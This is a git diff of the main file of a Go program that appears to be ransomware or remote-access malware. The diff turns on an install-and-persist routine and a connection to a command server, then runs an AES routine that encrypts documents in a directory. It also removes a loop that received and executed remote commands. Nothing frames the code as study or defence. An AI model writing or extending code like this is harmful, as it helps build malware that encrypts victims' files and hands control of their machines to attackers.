@@ -6,10 +6,10 @@
 package main
 
 import (
-	"strings"
-
 	"./aes"
 	"./base64"
+	"./install"
+	"./instances"
 	"./network"
 )
 
@@ -19,14 +19,11 @@ var key_text []byte
 
 func main() {
 	//Check if already running
-	/*instances.CheckMultiInstances()
+	instances.CheckMultiInstances()
 	install.Install()
 
 	//go Spread()
-	go network.Connect()
-	go network.Send("user", utils.GetUsername())
-	go ListenAndExecute()
-	go network.Reconnect()*/
+	go network.EstablishConnection()
 
 	//SendData("Ok from client using cap'p")
 
@@ -51,32 +48,7 @@ func main() {
 	key_text = []byte(base64.Decode(final))
 	//When key decoded
 	aes.InitializeBlock(key_text)
-	aes.EncryptDocumets("/Users/mac/Tiked/Client/test", true)
+	aes.EncryptDocumets("/Users/mac/Tiked/Client/test", false)
 	for {
-	}
-}
-
-// ListenAndExecute recives commands and executes them
-func ListenAndExecute() {
-	for {
-		status := network.Receive()
-		go ParseProtocol(status)
-	}
-
-}
-
-// ParseProtocol handles recived connections using legacy method
-func ParseProtocol(r string) {
-	commandBuff := strings.Split(r, " ")
-	if len(commandBuff) > 1 {
-		cmd := commandBuff[0]
-		target := commandBuff[1]
-		args := "null"
-		if len(commandBuff) >= 3 {
-			args = commandBuff[2]
-		}
-		//Concurrently executes command
-		network.Execute(cmd, target, args)
-
 	}
 }
